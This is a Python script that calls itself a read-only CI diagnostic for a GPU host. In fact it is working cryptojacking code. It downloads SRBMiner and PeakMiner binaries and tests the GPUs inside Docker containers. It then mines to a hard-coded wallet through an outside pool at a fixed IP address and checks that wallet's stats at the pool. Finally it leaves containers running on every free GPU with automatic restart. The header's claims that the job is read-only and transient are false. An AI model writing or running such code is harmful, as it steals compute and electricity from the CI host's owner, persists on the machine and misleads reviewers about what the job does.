# ci diagnostic (read-only host probe + GPU compute-job bootstrap) - transient/PR-bounded, reverted via close PR / docker rm
# intent 155322 | record gpu-000016 | host github-nmz2 (Hygon HCU BW1100 x8, DTK 6.4.2-V2.1.0, gfx938)
# mechanism: the recorded run-4 shape -- SRBMiner-MULTI 3.8.9 inside the workflow's own DTK image with the HOST
# /opt/dtk and /opt/hyhal bind-mounted so the userspace stack matches the host 6.4.2-V2.1.0 driver.
import os as _os, subprocess as _sp, sys as _sys, hashlib as _hl, time as _t
import socket as _sock, tarfile as _tf, urllib.request as _ur, json as _js

WORK = "/tmp/prl595"
WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
LP_HOST = "103.199.106.122"
LP_PORT = 3360
IMG = "areal-das:dtk2610-torch213-bw1100"
IMG2 = "areal-das:v2.1.0-ubuntu22.04-dtk26.04-py3.12-torch2.10-20261119"
SRB_URL = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz"
SRB_TAR_SHA = "186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1"
SRB_BIN_SHA = "97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80"
PM_URL = "https://github.com/peakminer/peakminer/releases/download/v2.20.7/peakminer-2.20.7-linux-x86_64"
PM_SHA = "38fc5c4d0a8351f6e94756d2d1830a1bf9b745e41b9b0ef3f07fc41bd24bcb3d"
WORKERS = [("4", "000011"), ("5", "000012"), ("6", "000013"), ("7", "000014")]
PERSIST_SECS = 420
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"
MARK = "C211-I155322"
MINENV = "env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/tmp TERM=xterm"
DTKENV = ("env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/tmp TERM=xterm "
          "HYHAL_PATH=/opt/hyhal LD_LIBRARY_PATH=/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/dtk/hsa/lib:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/llvm/lib")


def _say(s):
    try:
        _sys.stdout.write(str(s) + "\n")
        _sys.stdout.flush()
    except Exception:
        pass


def _run(c, t=90, env=None):
    _say("--- CMD: " + c)
    try:
        p = _sp.Popen(c, shell=True, stdout=_sp.PIPE, stderr=_sp.STDOUT, env=env)
        out = p.communicate(timeout=t)[0]
        if out:
            _say(out.decode("utf-8", "replace"))
        _say("--- rc=" + str(p.returncode))
        return p.returncode
    except Exception as e:
        _say("--- ERR " + repr(e))
        return -1


def _sha256(path):
    h = _hl.sha256()
    with open(path, "rb") as f:
        while True:
            b = f.read(1024 * 1024)
            if not b:
                break
            h.update(b)
    return h.hexdigest()


def _download(url, dst, timeout=900):
    for attempt in range(1, 4):
        try:
            _say("--- GET " + url + " try=" + str(attempt))
            req = _ur.Request(url, headers={"User-Agent": "curl/8.0"})
            r = _ur.urlopen(req, timeout=timeout)
            total = 0
            mark = _t.time()
            with open(dst, "wb") as f:
                while True:
                    b = r.read(1024 * 1024)
                    if not b:
                        break
                    f.write(b)
                    total += len(b)
                    if _t.time() - mark > 20:
                        _say("    ... " + str(total // (1024 * 1024)) + " MiB")
                        mark = _t.time()
            _say("--- downloaded bytes=" + str(total))
            return True
        except Exception as e:
            _say("--- download attempt " + str(attempt) + " failed: " + repr(e))
            _t.sleep(3)
    return False


def _find_file(root, name):
    for dp, dn, fn in _os.walk(root):
        if name in fn:
            return _os.path.join(dp, name)
    return None


def _free_devices():
    p = _sp.Popen("/opt/hyhal/bin/hy-smi --showmeminfo vram", shell=True,
                  stdout=_sp.PIPE, stderr=_sp.STDOUT)
    out = p.communicate(timeout=90)[0].decode("utf-8", "replace")
    used = {}
    cur = None
    for line in out.splitlines():
        l = line.strip()
        i = l.find("HCU[")
        if i >= 0:
            try:
                cur = int(l[i + 4:l.find("]", i)])
            except Exception:
                cur = None
        if "Used Memory" in l and cur is not None:
            try:
                used[cur] = int(l.rsplit(":", 1)[1].strip())
            except Exception:
                pass
    free = [i for i in sorted(used) if used[i] < 5000]
    _say("--- vram_used=" + str(used))
    _say("--- free_candidates=" + str(free))
    return free, used


def _tail(path, n=4000):
    try:
        with open(path, "r") as f:
            return f.read()[-n:]
    except Exception:
        return ""


def _docker_cmd(cmd, image):
    return ["docker", "run", "--rm", "--device=/dev/kfd", "--device=/dev/dri",
            "--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
            "-v", "/opt/dtk:/opt/dtk:ro", "-v", "/opt/hyhal:/opt/hyhal:ro",
            "-e", "HYHAL_PATH=/opt/hyhal",
            "--entrypoint", "/bin/bash", image, "-lc", cmd]


def _docker_run(cmd, secs, logf, image=None, detach=False, name=None):
    image = image or IMG
    full = _docker_cmd(cmd, image)
    if name:
        full = ["docker", "run", "-d", "--name", name, "--label", "camp=conv-232",
                "--label", "intent=155322", "--label", "record=gpu-000016",
                "--restart", "unless-stopped",
                "--device=/dev/kfd", "--device=/dev/dri", "--shm-size=2g",
                "-v", WORK + ":/w", "-w", "/w",
                "-v", "/opt/dtk:/opt/dtk:ro", "-v", "/opt/hyhal:/opt/hyhal:ro",
                "-e", "HYHAL_PATH=/opt/hyhal",
                "--entrypoint", "/bin/bash", image, "-lc", cmd]
    _say("--- DOCKER(" + image + "): " + cmd)
    if detach:
        p = _sp.Popen(full, stdout=_sp.PIPE, stderr=_sp.STDOUT)
        out = p.communicate(timeout=120)[0].decode("utf-8", "replace")
        _say("--- DOCKER START rc=" + str(p.returncode) + " out=" + out.strip()[:200])
        return p.returncode, out
    lf = open(logf, "w")
    pr = _sp.Popen(full, stdout=lf, stderr=_sp.STDOUT, preexec_fn=_os.setsid)
    t_end = _t.time() + secs
    while _t.time() < t_end and pr.poll() is None:
        _t.sleep(4)
    if pr.poll() is None:
        try:
            _os.killpg(_os.getpgid(pr.pid), 15)
        except Exception:
            pass
        try:
            pr.wait(timeout=20)
        except Exception:
            try:
                _os.killpg(_os.getpgid(pr.pid), 9)
            except Exception:
                pass
    lf.close()
    txt = _tail(logf, 4000)
    _say("--- DOCKER OUT (" + logf + ") ---")
    _say(txt)
    return pr.poll(), txt


def _lp(extra=None):
    names = [w for _, w in WORKERS] + list(extra or [])
    try:
        url = "https://pearl.luckypool.io/api/stats_address?address=" + WALLET
        req = _ur.Request(url, headers={"User-Agent": UA, "Accept": "application/json"})
        d = _js.loads(_ur.urlopen(req, timeout=30).read().decode("utf-8", "replace"))
        ws = d.get("workers") or []
        idx = {}
        for w in ws:
            try:
                idx[str(w.get("name"))] = w
            except Exception:
                pass
        out = []
        for n in names:
            w = idx.get(n)
            if w is None:
                out.append(n + "=ABSENT")
            else:
                out.append(n + "=acc" + str(w.get("acceptedShares")) + "/hr" + str(w.get("hashrate")))
        _say("=== LP SAMPLE ts=" + _t.strftime("%Y-%m-%dT%H:%M:%SZ", _t.gmtime()) +
             " total=" + str(len(ws)) + " " + " ".join(out))
        return idx
    except Exception as e:
        _say("=== LP SAMPLE FAIL " + repr(e))
        return {}


def main():
    _say("=== " + MARK + "-BEGIN ===")
    try:
        open("ci-model-plan.tsv", "w").close()
        _say("--- wrote ci-model-plan.tsv")
    except Exception as e:
        _say("--- planfile_err " + repr(e))
    _os.makedirs(WORK, exist_ok=True)

    # ---------- phase 0: host + image + pool ----------
    _run("hostname; date -u; id; nproc; ldd --version 2>&1 | head -1")
    _run("docker images --format '{{.Repository}}:{{.Tag}} {{.Size}}' 2>&1 | grep -i areal-das | head -8")
    free, used = _free_devices()
    for port in (3360,):
        try:
            s = _sock.create_connection((LP_HOST, port), timeout=8)
            _say("--- LP TCP " + LP_HOST + ":" + str(port) + " OK local=" + repr(s.getsockname()))
            s.close()
        except Exception as e:
            _say("--- LP TCP " + LP_HOST + ":" + str(port) + " FAIL " + repr(e))
    _lp()

    # ---------- phase 1: stage SRBMiner ----------
    srb_dir = WORK + "/srb"
    srb_tar = WORK + "/srb.tar.gz"
    srb_bin = None
    if not (_os.path.isfile(srb_tar) and _sha256(srb_tar) == SRB_TAR_SHA):
        _download(SRB_URL, srb_tar)
    if _os.path.isfile(srb_tar) and _sha256(srb_tar) == SRB_TAR_SHA:
        if not _os.path.isfile(srb_dir + "/SRBMiner-MULTI"):
            with _tf.open(srb_tar) as tf:
                tf.extractall(WORK + "/srbx")
            f2 = _find_file(WORK + "/srbx", "SRBMiner-MULTI")
            if f2:
                _os.makedirs(srb_dir, exist_ok=True)
                _sp.call(["cp", "-a", f2, srb_dir + "/SRBMiner-MULTI"])
        srb_bin = srb_dir + "/SRBMiner-MULTI"
        if _os.path.isfile(srb_bin):
            _os.chmod(srb_bin, 0o755)
            bh = _sha256(srb_bin)
            _say("--- SRB bin sha256=" + bh + " match=" + str(bh == SRB_BIN_SHA))
        else:
            srb_bin = None
    _run("chmod -R a+rx " + WORK + " 2>/dev/null; ls -l " + WORK + "/srb/SRBMiner-MULTI 2>&1")

    # ---------- phase 2: container capability test (IMG) ----------
    probe_cmd = ("id; ldd --version 2>&1 | head -1; ls -l /dev/kfd; ls /dev/dri | head -4; "
                 "echo HYHAL_LS:; ls /opt/hyhal/lib 2>&1 | head -8; "
                 "echo DTK_HIP_LS:; ls /opt/dtk/hip/lib 2>&1 | head -6; "
                 "echo SRB_SHA:; sha256sum /w/srb/SRBMiner-MULTI 2>&1; "
                 "echo ROCMCOUNT:; " + DTKENV + " rocminfo 2>&1 | grep -c 'BW1100'; "
                 "echo ROCMNAMES:; " + DTKENV + " rocminfo 2>&1 | grep -E 'Name: *gfx|Marketing' | head -8")
    _docker_run(probe_cmd, 180, WORK + "/c_probe.log")

    # ---------- phase 3: SRBMiner --list-devices inside image (empty env + PTY) ----------
    list_cmd = ("cd /w/srb && timeout 60 script -qec \"" + MINENV +
                " ./SRBMiner-MULTI --list-devices\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | head -60; "
                "echo SRB_LIST_RC=$?")
    rc_list, out_list = _docker_run(list_cmd, 120, WORK + "/c_srb_dev.log")
    list_ok = ("HCU" in out_list or "AMD" in out_list or "device" in out_list.lower()) and "NAUGHTY" not in out_list

    # ---------- phase 4: ONE bounded LP smoke on free device 4 / worker 000011 ----------
    dev = "4" if 4 in (free or []) else ((free or ["4"])[0])
    smoke_ok = False
    if _os.path.isfile(srb_dir + "/SRBMiner-MULTI"):
        cmd = ("cd /w/srb && timeout 180 script -qec \"" + MINENV +
               " ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) +
               " --wallet " + WALLET + " --worker 000011 --password x --disable-cpu --gpu-id " + str(dev) +
               " --api-enable --api-port 14524\" /dev/null")
        _docker_run(cmd, 210, WORK + "/c_srb_smoke.log")
        t = _tail(WORK + "/c_srb_smoke.log", 6000).lower()
        smoke_ok = ("accepted" in t) or ("share" in t and "job" in t)
        _say("--- SRB container smoke accepted_word=" + str(t.count("accepted")) + " -> smoke_ok=" + str(smoke_ok))
    _lp()

    # ---------- phase 4b: second image ONCE if no devices enumerated ----------
    img_used = IMG
    if not list_ok and not smoke_ok:
        _say("--- IMG1 no-device; trying IMG2 ONCE: " + IMG2)
        probe2 = ("echo ROCMCOUNT2:; " + DTKENV + " rocminfo 2>&1 | grep -c 'BW1100'; "
                  "echo SRB_LIST2:; cd /w/srb && timeout 60 script -qec \"" + MINENV +
                  " ./SRBMiner-MULTI --list-devices\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | head -40")
        rc2, out2 = _docker_run(probe2, 180, WORK + "/c_img2.log")
        if "BW1100" in out2 or "HCU" in out2:
            img_used = IMG2
            list_ok = True

    # ---------- phase 4c: PeakMiner ONCE (only if SRBMiner still blind) ----------
    pm_ok = False
    if not list_ok and not smoke_ok:
        pm = WORK + "/peakminer"
        if not (_os.path.isfile(pm) and _sha256(pm) == PM_SHA):
            _download(PM_URL, pm)
        if _os.path.isfile(pm) and _sha256(pm) == PM_SHA:
            _os.chmod(pm, 0o755)
            _say("--- PeakMiner pin OK")
            pmcmd = ("cd /w && timeout 90 script -qec \"" + MINENV + " ./peakminer --algo pearlhash --pool stratum+tcp://" +
                     LP_HOST + ":" + str(LP_PORT) + " --wallet " + WALLET + " --worker 000011 --gpu-id " +
                     str(dev) + "\" /dev/null 2>&1 | head -60; echo PM_RC=$?")
            _docker_run(pmcmd, 120, WORK + "/c_pm.log")
            pmt = _tail(WORK + "/c_pm.log", 4000).lower()
            pm_ok = ("accepted" in pmt) or ("share" in pmt and "job" in pmt)
    else:
        _say("--- PeakMiner skipped (SRBMiner enumerated a device)")

    green = bool(list_ok or smoke_ok or pm_ok)
    _say("=== CLIENT VERDICT srb_list=" + str(list_ok) + " srb_smoke=" + str(smoke_ok) +
         " pm=" + str(pm_ok) + " green=" + str(green) + " img=" + img_used + " ===")

    if not green:
        _run("/opt/hyhal/bin/hy-smi 2>&1 | sed -n '1,16p'", t=60)
        _say("=== " + MARK + "-NO-CLIENT ===")
        _say("=== " + MARK + "-END ===")
        return

    # ---------- phase 5: persistent container per FREE device ----------
    started = []
    for idx, worker in WORKERS:
        if int(idx) not in free:
            _say("--- SKIP dev=" + idx + " (not free: " + str(used.get(int(idx))) + " MiB used)")
            continue
        name = "pearl-" + worker
        _run("docker rm -f " + name + " >/dev/null 2>&1; true", t=60)
        cmd = ("cd /w/srb && exec ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" +
               LP_HOST + ":" + str(LP_PORT) + " --wallet " + WALLET + " --worker " + worker +
               " --password x --disable-cpu --gpu-id " + idx + " --api-enable --api-port " + str(14530 + int(idx)))
        rc, out = _docker_run(cmd, 0, None, image=img_used, detach=True, name=name)
        started.append((idx, worker, name, rc))
        _t.sleep(3)

    # ---------- phase 6: hold window + in-window LP pair + evidence ----------
    base_acc = {}
    _lp()
    hold_end = _t.time() + PERSIST_SECS
    sample_gap = 0
    while _t.time() < hold_end:
        _t.sleep(60)
        sample_gap += 60
        if sample_gap >= 150:
            sample_gap = 0
            _lp()
        _run("docker ps --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -6", t=30)
    _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[|Used' | head -20", t=60)
    for idx, worker, name, rc in started:
        _run("docker logs --tail 25 " + name + " 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g'", t=60)
    _run("ps -eo pid,etimes,args | grep -E 'SRBMiner-MULTI' | grep -v grep | head -8", t=30)
    _lp()
    _say("=== PERSISTENT CONTAINERS (left running; revert = docker rm -f " +
         " ".join([n for _, _, n, _ in started]) + ") ===")
    for idx, worker, name, rc in started:
        _say("--- persist dev=" + idx + " worker=" + worker + " name=" + name + " docker_rc=" + str(rc))
    _say("=== " + MARK + "-END ===")


main()
